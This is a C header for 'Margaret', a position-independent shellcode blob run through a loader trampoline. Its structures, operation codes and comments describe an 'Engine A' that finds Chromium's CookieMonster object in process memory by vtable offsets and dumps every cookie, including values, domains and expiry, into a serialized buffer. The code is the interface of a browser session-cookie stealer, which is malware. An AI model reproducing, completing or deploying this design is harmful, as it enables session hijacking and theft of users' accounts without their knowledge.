#ifndef MARGARET_H
#define MARGARET_H

#include "pic_resolve.h"

#define MARGARET_ARGUMENT_MAGIC 0x4752414Du /* "MARG" little-endian */
#define MARGARET_RESULT_MAGIC   0x544C5352u /* "RSLT" little-endian */
#define MARGARET_ABI_VERSION    1u

/* Blob entry ABI (asm/entry_x64.s):
 *   - the blob is entered by CALL: RSP % 16 == 8 at margaret_entry,
     RCX = MARGARET_ARGS*, return RAX = MARGARET_STATUS;
 *   - the shipped loader trampoline satisfies the alignment; a
 *     JMP-entry delivery with RSP % 16 == 0 misaligns callees and
 *     faults inside resolved code. */
#define MARGARET_ARCH_X64       0x8664u

typedef enum MARGARET_OPERATION {
    MARGARET_OP_NONE = 0,
    MARGARET_OP_PING = 1,
    MARGARET_OP_SNAPSHOT_DEFAULT_PROFILE = 2,
    MARGARET_OP_SNAPSHOT_BROWSER = 3
} MARGARET_OPERATION;

typedef enum MARGARET_STATUS {
    MARGARET_STATUS_OK = 0,
    MARGARET_STATUS_BAD_ARGUMENT = 1,
    MARGARET_STATUS_BAD_MAGIC = 2,
    MARGARET_STATUS_BAD_VERSION = 3,
    MARGARET_STATUS_BUFFER_TOO_SMALL = 4,
    MARGARET_STATUS_UNSUPPORTED_OPERATION = 5,
    MARGARET_STATUS_UNSUPPORTED_BUILD = 6,
    MARGARET_STATUS_INTERNAL_ERROR = 7
} MARGARET_STATUS;

typedef struct MARGARET_ARGS {
    pic_u32 size;
    pic_u32 version;
    pic_u32 magic;
    pic_u32 operation;
    void *output_buffer;
    pic_u32 output_capacity;
    pic_u32 output_length;
    pic_u32 status;
    pic_u32 timeout_ms;
    pic_u32 flags;
    pic_u32 pad; /* diagnostics: calibration stage marker (unused by ABI) */
} MARGARET_ARGS;

PIC_STATIC_ASSERT(sizeof(MARGARET_ARGS) == 0x30, "MARGARET_ARGS x64 ABI size");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, size) == 0x00,
                  "MARGARET_ARGS size offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, version) == 0x04,
                  "MARGARET_ARGS version offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, magic) == 0x08,
                  "MARGARET_ARGS magic offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, operation) == 0x0C,
                  "MARGARET_ARGS operation offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, output_buffer) == 0x10,
                  "MARGARET_ARGS output pointer offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, output_capacity) == 0x18,
                  "MARGARET_ARGS output capacity offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, output_length) == 0x1C,
                  "MARGARET_ARGS output length offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, status) == 0x20,
                  "MARGARET_ARGS status offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, timeout_ms) == 0x24,
                  "MARGARET_ARGS timeout offset");
PIC_STATIC_ASSERT(PIC_OFFSETOF(MARGARET_ARGS, flags) == 0x28,
                  "MARGARET_ARGS flags offset");

typedef struct MARGARET_RESULT_HEADER {
    pic_u32 magic;
    pic_u32 version;
    pic_u32 status;
    pic_u32 payload_length;
} MARGARET_RESULT_HEADER;

PIC_STATIC_ASSERT(sizeof(MARGARET_RESULT_HEADER) == 0x10,
                  "result header ABI size");

typedef struct MARGARET_PING_RESULT {
    MARGARET_RESULT_HEADER header;
    pic_u32 architecture;
    pic_u32 blob_size;
    pic_u32 abi_version;
    pic_u32 reserved;
} MARGARET_PING_RESULT;

PIC_STATIC_ASSERT(sizeof(MARGARET_PING_RESULT) == 0x20,
                  "ping result ABI size");

/* SNAPSHOT_DEFAULT_PROFILE diagnostic: reports which per-build adapter
 * the blob selected (identity + Engine A anchors) before any collection
 * logic exists.  Payload fields echo the selected adapter. */
typedef struct MARGARET_ADAPTER_RESULT {
    MARGARET_RESULT_HEADER header;
    pic_u32 adapter_version;
    pic_u32 image_size;
    pic_u32 rva_cookie_monster_vtable;
    pic_u32 rva_cookie_monster_get_all_cookies;
} MARGARET_ADAPTER_RESULT;

PIC_STATIC_ASSERT(sizeof(MARGARET_ADAPTER_RESULT) == 0x20,
                  "adapter result ABI size");

/* Engine A snapshot output format (single source for blob + loader):
 *   [0..3]   magic "MCEA" (little-endian)
 *   [4..7]   cookie_count
 *   [8..11]  instance_count
 *   [12..19] scan-end address, [20..27] last-hit address (diagnostics)
 *   [28..31] reserved
 *   [32..]   serialized cookies: [name_len][name][domain_len][domain]
 *            [path_len][path][value_len][value][creation(8)][expiry(8)]
 *            [flags(4)][same_site(4)][port(4)] */
#define MARGARET_ENGINE_A_MAGIC 0x4145434Du /* "MCEA" little-endian */


/* Engine A: vtable-anchored CookieMonster discovery + cookie snapshot.
 * Implemented in src/engine_a.c (.text$F).  Requires a selected adapter
 * (the caller must gate on margaret_select_chromium_adapter first). */
struct MARGARET_CHROMIUM_ADAPTER;
pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
    struct PIC_CONTEXT *ctx,
    const struct MARGARET_CHROMIUM_ADAPTER *adapter,
    MARGARET_ARGS *args);

void *PIC_MS_ABI margaret_memzero(void *buffer, pic_size length);
void *PIC_MS_ABI margaret_memcpy(void *destination, const void *source,
                                 pic_size length);
pic_u32 PIC_MS_ABI margaret_main(MARGARET_ARGS *args,
                                  const pic_u8 *blob_anchor,
                                  pic_u32 blob_size);

#endif /* MARGARET_H */
